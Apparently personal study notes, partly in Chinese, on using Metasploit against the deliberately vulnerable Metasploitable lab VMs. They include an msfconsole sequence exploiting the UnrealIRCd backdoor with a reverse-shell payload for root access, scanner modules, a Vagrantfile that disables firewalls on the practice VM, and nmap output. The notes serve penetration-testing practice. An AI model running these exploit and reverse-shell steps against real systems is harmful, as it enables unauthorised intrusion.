---
title: metasploit
date: 2019-02-27 14:25:12
tags:
---

# Metasploit

* 测试用的被攻击Linux虚拟机镜像下载

> [Metasploitable](https://sourceforge.net/projects/metasploitable/)

* start msconsole

```console
service postgresql start
msconsole
```

* IRC on Metasploitable

Kali Linux: 192.168.56.100
Metasploitable: 192.168.56.101

```console
search Unreal 3.2.1.8
use exploit/unix/irc/unreal_ircd_3281_backdoor
show options
set RHOSTS 192.168.56.101
show payloads
set payload cmd/unix/reverse
show options
set LHOST 192.168.56.100
run
```

Can connect to 192.168.56.101 with root account

* Modules

> [Metasploit系列教程第一季](https://www.bilibili.com/video/av16925201)

1. Port scan

```console
# nmap -v -sV 192.168.56.101
```

```console
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.101
run
```

2. SMB scan for windows system information

```console
search smb_version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.101
run
```

3. 服务识别

```console
search ssh_version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.56.101
run
```

```console
search ftp_version
use auxiliary/scanner/ftp/ftp_version
```

4. Sniffer

auxiliary/sniffer/psnuffle

TODO

* 测试用的被攻击Windows 2008

> [Metasploitable3](https://github.com/rapid7/metasploitable3)

Vagrantfile

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  config.vm.synced_folder '.', '/vagrant', disabled: true

  config.vm.define "win2k8" do |win2k8|
    # Base configuration for the VM and provisioner
    win2k8.vm.box = "rapid7/metasploitable3-win2k8"
    win2k8.vm.hostname = "metasploitable3-win2k8"
    win2k8.vm.communicator = "winrm"
    win2k8.winrm.retry_limit = 60
    win2k8.winrm.retry_delay = 10

    win2k8.vm.network "private_network", name: "vboxnet0", ip: "192.168.56.108"
    win2k8.vm.provider "virtualbox" do |v|
      v.name = "Metasploitable3-win2k8"
      v.memory = 768
      v.cpus = 1
    end

    # Configure Firewall to open up vulnerable services
    case ENV['MS3_DIFFICULTY']
      when 'easy'
        win2k8.vm.provision :shell, inline: "C:\\startup\\disable_firewall.bat"
      else
        win2k8.vm.provision :shell, inline: "C:\\startup\\enable_firewall.bat"
        win2k8.vm.provision :shell, inline: "C:\\startup\\configure_firewall.bat"
    end

    # Insecure share from the Linux machine
    win2k8.vm.provision :shell, inline: "C:\\startup\\install_share_autorun.bat"
    win2k8.vm.provision :shell, inline: "C:\\startup\\setup_linux_share.bat"
    win2k8.vm.provision :shell, inline: "rm C:\\startup\\*" # Cleanup startup scripts
  end

=begin
  config.vm.define "ub1404" do |ub1404|
    ub1404.vm.box = "rapid7/metasploitable3-ub1404"
    ub1404.vm.hostname = "metasploitable3-ub1404"
    config.ssh.username = 'vagrant'
    config.ssh.password = 'vagrant'

    ub1404.vm.network "private_network", ip: '172.28.128.3'

    ub1404.vm.provider "virtualbox" do |v|
      v.name = "Metasploitable3-ub1404"
      v.memory = 2048
    end
  end
=end

end
```

```console
$ vagrant -h
$ vagrant up
$ vagrant halt
$ vagrant suspend
$ vagrant resume
$ vagrant ssh

$ vagrant up win2k8
$ vagrant halt win2k8

$ vagrant suspend win2k8
$ vagrant resume win2k8

### windows commands after vagrant ssh
# check free memory
$ wmic OS get FreePhysicalMemory,FreeVirtualMemory,FreeSpaceInPagingFiles /VALUE
# check system information like memory
$ systeminfo
# use following command to add route
$ route -p add 192.168.56.0 mask 255.255.255.0 192.168.56.1
# or following command
$ netsh int ip set address "Local Area Connection 2" address=192.168.56.108 mask=255.255.255.0 gateway=192.168.56.1
```

```console
$ vagrant up
Bringing machine 'win2k8' up with 'virtualbox' provider...
==> win2k8: Checking if box 'rapid7/metasploitable3-win2k8' version '0.1.0-weekly' is up to date...
==> win2k8: Clearing any previously set forwarded ports...
==> win2k8: Clearing any previously set network interfaces...
==> win2k8: Preparing network interfaces based on configuration...
    win2k8: Adapter 1: nat
    win2k8: Adapter 2: hostonly
==> win2k8: Forwarding ports...
    win2k8: 3389 (guest) => 3389 (host) (adapter 1)
    win2k8: 22 (guest) => 2222 (host) (adapter 1)
    win2k8: 5985 (guest) => 55985 (host) (adapter 1)
    win2k8: 5986 (guest) => 55986 (host) (adapter 1)
==> win2k8: Running 'pre-boot' VM customizations...
==> win2k8: Booting VM...
==> win2k8: Waiting for machine to boot. This may take a few minutes...
    win2k8: WinRM address: 127.0.0.1:55985
    win2k8: WinRM username: vagrant
    win2k8: WinRM execution_time_limit: PT2H
    win2k8: WinRM transport: negotiate
==> win2k8: Machine booted and ready!
==> win2k8: Checking for guest additions in VM...
    win2k8: The guest additions on this VM do not match the installed version of
    win2k8: VirtualBox! In most cases this is fine, but in rare cases it can
    win2k8: prevent things such as shared folders from working properly. If you see
    win2k8: shared folder errors, please make sure the guest additions within the
    win2k8: virtual machine match the version of VirtualBox you have installed on
    win2k8: your host and reload your VM.
    win2k8: 
    win2k8: Guest Additions Version: 5.2.8
    win2k8: VirtualBox Version: 6.0
==> win2k8: Setting hostname...
==> win2k8: Configuring and enabling network interfaces...
==> win2k8: Machine already provisioned. Run `vagrant provision` or use the `--provision`
==> win2k8: flag to force provisioning. Provisioners marked to run always will still run.
$
```

```console
$ nmap 192.168.56.108

Starting Nmap 7.60 ( https://nmap.org ) at 2019-02-28 15:20 CST
Nmap scan report for 192.168.56.108
Host is up (0.00077s latency).
Not shown: 991 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
4848/tcp  open  appserv-http
8080/tcp  open  http-proxy
8383/tcp  open  m2mservices
9200/tcp  open  wap-wsp
49153/tcp open  unknown
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds
```
